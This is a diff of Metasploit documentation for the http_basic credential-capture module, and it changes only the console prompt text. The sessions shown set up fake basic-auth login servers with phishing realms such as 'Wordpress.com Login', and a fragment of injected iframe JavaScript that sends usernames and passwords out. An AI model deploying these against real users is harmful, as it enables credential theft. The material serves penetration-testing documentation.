@@ -45,14 +45,14 @@ This module creates a mock web server which, utilizing a HTTP 401 response, prom
 Server:
 
 ```
-msf5 > use auxiliary/server/capture/http_basic 
-msf5 auxiliary(server/capture/http_basic) > set REALM "level_15 or view_access"
+msf > use auxiliary/server/capture/http_basic 
+msf auxiliary(server/capture/http_basic) > set REALM "level_15 or view_access"
 REALM => level_15 or view_access
-msf5 auxiliary(server/capture/http_basic) > set uripath '/cisco'
+msf auxiliary(server/capture/http_basic) > set uripath '/cisco'
 uripath => /cisco
-msf5 auxiliary(server/capture/http_basic) > run
+msf auxiliary(server/capture/http_basic) > run
 [*] Auxiliary module running as background job 0.
-msf5 auxiliary(server/capture/http_basic) > 
+msf auxiliary(server/capture/http_basic) > 
 [*] Using URL: http://0.0.0.0:80/cisco
 [*] Local IP: http://10.1.1.1:80/cisco
 [*] Server started.
@@ -78,7 +78,7 @@ HTTP request sent, awaiting response... 404 Not Found
 Server:
 
 ```
-msf5 > openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+msf > openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
 [*] exec: openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
 
 Generating a RSA private key
@@ -100,10 +100,10 @@ Organization Name (eg, company) [Internet Widgits Pty Ltd]:
 Organizational Unit Name (eg, section) []:
 Common Name (e.g. server FQDN or YOUR name) []:
 Email Address []:
-msf5 > cat key.pem certificate.pem > selfsigned.pem
+msf > cat key.pem certificate.pem > selfsigned.pem
 [*] exec: cat key.pem certificate.pem > selfsigned.pem
 
-msf5 > cat /root/metasploit-framework/selfsigned.pem
+msf > cat /root/metasploit-framework/selfsigned.pem
 [*] exec: cat /root/metasploit-framework/selfsigned.pem
 
 -----BEGIN PRIVATE KEY-----
@@ -155,16 +155,16 @@ NDO8po38u2ba52E56abfg0ZlFBqsua2s1TPHIyQ9iovTPMg1E5UTTGebaN6/BaMh
 Oj6N43ld9EONST6BhP3v1buoWHi1FMouocrUkUDuahiHoLlK4ERSUrb4uNnwko24
 WdNCCmA8APA1qf2BYVqs
 -----END CERTIFICATE-----
-msf5 > use auxiliary/server/capture/http_basic 
-msf5 auxiliary(server/capture/http_basic) > set ssl true
+msf > use auxiliary/server/capture/http_basic 
+msf auxiliary(server/capture/http_basic) > set ssl true
 ssl => true
-msf5 auxiliary(server/capture/http_basic) > set srvport 443
+msf auxiliary(server/capture/http_basic) > set srvport 443
 srvport => 443
-msf5 auxiliary(server/capture/http_basic) > set sslcert /root/metasploit-framework/selfsigned.pem
+msf auxiliary(server/capture/http_basic) > set sslcert /root/metasploit-framework/selfsigned.pem
 sslcert => /root/metasploit-framework/selfsigned.pem
-msf5 auxiliary(server/capture/http_basic) > run
+msf auxiliary(server/capture/http_basic) > run
 [*] Auxiliary module running as background job 0.
-msf5 auxiliary(server/capture/http_basic) > 
+msf auxiliary(server/capture/http_basic) > 
 [*] Using URL: https://0.0.0.0:443/4w0tML
 [*] Local IP: https://192.168.2.117:443/4w0tML
 [*] Server started.
@@ -203,14 +203,14 @@ HTML Payload Injected:
 Server:
 
 ```
-msf5 > use auxiliary/server/capture/http_basic 
-msf5 auxiliary(server/capture/http_basic) > set uripath '/'
+msf > use auxiliary/server/capture/http_basic 
+msf auxiliary(server/capture/http_basic) > set uripath '/'
 uripath => /
-msf5 auxiliary(server/capture/http_basic) > set REALM "Wordpress.com Login"
+msf auxiliary(server/capture/http_basic) > set REALM "Wordpress.com Login"
 REALM => Wordpress.com Login
-msf5 auxiliary(server/capture/http_basic) > run
+msf auxiliary(server/capture/http_basic) > run
 [*] Auxiliary module running as background job 0.
-msf5 auxiliary(server/capture/http_basic) > 
+msf auxiliary(server/capture/http_basic) > 
 [*] Using URL: http://0.0.0.0:80/
 [*] Local IP: http://192.168.2.117:80/
 [*] Server started.
@@ -244,14 +244,14 @@ document.write('&lt;iframe width="0" height="0" src="http://' + username + ':' +
 Sever:
 
 ```
-msf5 > use auxiliary/server/capture/http_basic 
-msf5 auxiliary(server/capture/http_basic) > set uripath '/'
+msf > use auxiliary/server/capture/http_basic 
+msf auxiliary(server/capture/http_basic) > set uripath '/'
 uripath => /
-msf5 auxiliary(server/capture/http_basic) > set REALM "Login"
+msf auxiliary(server/capture/http_basic) > set REALM "Login"
 REALM => Login
-msf5 auxiliary(server/capture/http_basic) > run
+msf auxiliary(server/capture/http_basic) > run
 [*] Auxiliary module running as background job 0.
-msf5 auxiliary(server/capture/http_basic) > 
+msf auxiliary(server/capture/http_basic) > 
 [*] Using URL: http://0.0.0.0:80/
 [*] Local IP: http://192.168.2.117:80/
 [*] Server started.
@@ -262,7 +262,7 @@ msf5 auxiliary(server/capture/http_basic) >
 Decoding the cookie:
 
 ```
-msf5 auxiliary(server/capture/http_basic) > irb
+msf auxiliary(server/capture/http_basic) > irb
 [*] Starting IRB shell...
 [*] You are in auxiliary/server/capture/http_basic
 
